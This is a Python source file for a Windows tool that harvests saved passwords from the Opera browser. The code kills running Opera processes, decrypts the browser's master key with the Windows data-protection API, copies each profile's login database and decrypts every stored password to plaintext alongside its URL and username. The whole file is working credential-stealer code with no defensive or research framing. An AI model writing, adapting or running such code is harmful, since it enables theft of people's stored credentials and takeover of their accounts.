import os
import json
import base64
import sqlite3
import shutil
import time
import win32crypt
from Cryptodome.Cipher import AES
from pathlib import Path
from colorama import init, Fore, Style

# Initialize colorama for colored console output
init()


class OperaPasswordExtractor:
    def __init__(self, profile_path: str = None):
        """Initialize Opera password extractor with optional custom profile path."""
        self.browser_name = "Opera"
        self.profile_path = self._validate_profile_path(profile_path)
        self.local_state_path = self._get_local_state_path()

    def _get_default_path(self) -> str:
        """Retrieve the default Opera user data path for Windows."""
        opera_path = os.path.normpath(os.path.expandvars(r"%APPDATA%\Opera Software"))
        possible_folders = ["Opera Stable", "Opera GX", "Opera Developer"]
        for folder in possible_folders:
            full_path = os.path.join(opera_path, folder)
            if os.path.exists(full_path):
                return full_path
        raise FileNotFoundError(
            f"{Fore.RED}Opera profile folder not found{Style.RESET_ALL}"
        )

    def _validate_profile_path(self, profile_path: str) -> str:
        """Validate the provided profile path or fall back to the default."""
        if profile_path:
            path = Path(profile_path)
            if not path.exists():
                raise ValueError(
                    f"{Fore.RED}Profile path does not exist: {profile_path}{Style.RESET_ALL}"
                )
            return str(path)
        return self._get_default_path()

    def _get_local_state_path(self) -> str:
        """Construct the path to Opera's Local State file."""
        return os.path.join(self.profile_path, "Local State")

    def get_secret_key(self) -> bytes:
        """Retrieve and decrypt Opera's secret key from the Local State file."""
        try:
            with open(self.local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"{Fore.RED}Error getting secret key: {str(e)}{Style.RESET_ALL}")
            return None

    def decrypt_password(
        self, ciphertext: bytes, secret_key: bytes, profile: str = "", url: str = ""
    ) -> str:
        """Decrypt a password using the provided secret key."""
        if not ciphertext:
            return None

        if ciphertext.startswith(b"v10"):
            try:
                iv = ciphertext[3:15]
                encrypted_password = ciphertext[15:-16]
                tag = ciphertext[-16:]
                cipher = AES.new(secret_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt_and_verify(encrypted_password, tag)
                return decrypted_pass.decode("utf-8")
            except Exception:
                return None
        else:
            try:
                decrypted_pass = win32crypt.CryptUnprotectData(
                    ciphertext, None, None, None, 0
                )[1]
                return decrypted_pass.decode("utf-8")
            except Exception:
                return None

    def get_db_connection(self, login_db_path: str) -> sqlite3.Connection:
        """Create a temporary copy of the Login Data database and establish a connection."""
        try:
            if not os.path.exists(login_db_path):
                print(
                    f"{Fore.RED}Database file not found: {login_db_path}{Style.RESET_ALL}"
                )
                return None
            temp_path = "Loginvault.db"
            shutil.copy2(login_db_path, temp_path)
            return sqlite3.connect(temp_path)
        except Exception as e:
            print(f"{Fore.RED}Error connecting to database: {str(e)}{Style.RESET_ALL}")
            return None

    def get_login_data_paths(self) -> list:
        """Retrieve paths to all Login Data files, including the root profile."""
        paths = []
        root_login_data = os.path.join(self.profile_path, "Login Data")
        if os.path.exists(root_login_data):
            paths.append((root_login_data, "Root"))
        for folder in os.listdir(self.profile_path):
            if folder.startswith("Profile") or folder == "Default":
                login_data_path = os.path.join(self.profile_path, folder, "Login Data")
                if os.path.exists(login_data_path):
                    paths.append((login_data_path, folder))
        return paths

    def kill_browser_process(self):
        """Terminate Opera processes to prevent file access conflicts."""
        os.system("taskkill /F /IM opera.exe /T 2>nul")
        time.sleep(1)

    def extract_passwords(self, output_path=None) -> list:
        """Extract passwords from all Opera profiles and return credentials list."""
        credentials = []
        self.kill_browser_process()
        secret_key = self.get_secret_key()
        if not secret_key:
            print(f"{Fore.RED}Failed to get secret key{Style.RESET_ALL}")
            return credentials

        login_data_paths = self.get_login_data_paths()
        if not login_data_paths:
            print(
                f"{Fore.RED}No profiles with 'Login Data' found in {self.profile_path}{Style.RESET_ALL}"
            )
            return credentials

        for login_db_path, profile in login_data_paths:
            conn = self.get_db_connection(login_db_path)
            if not conn:
                continue
            cursor = conn.cursor()
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
            for row in cursor.fetchall():
                origin_url, username, ciphertext = row
                if origin_url and username and ciphertext:
                    password = self.decrypt_password(
                        ciphertext, secret_key, profile, origin_url
                    )
                    if password:
                        credentials.append(
                            {
                                "browser": self.browser_name,
                                "profile": profile,
                                "url": origin_url,
                                "username": username,
                                "password": password,
                            }
                        )
            cursor.close()
            conn.close()
            if os.path.exists("Loginvault.db"):
                os.remove("Loginvault.db")

        return credentials
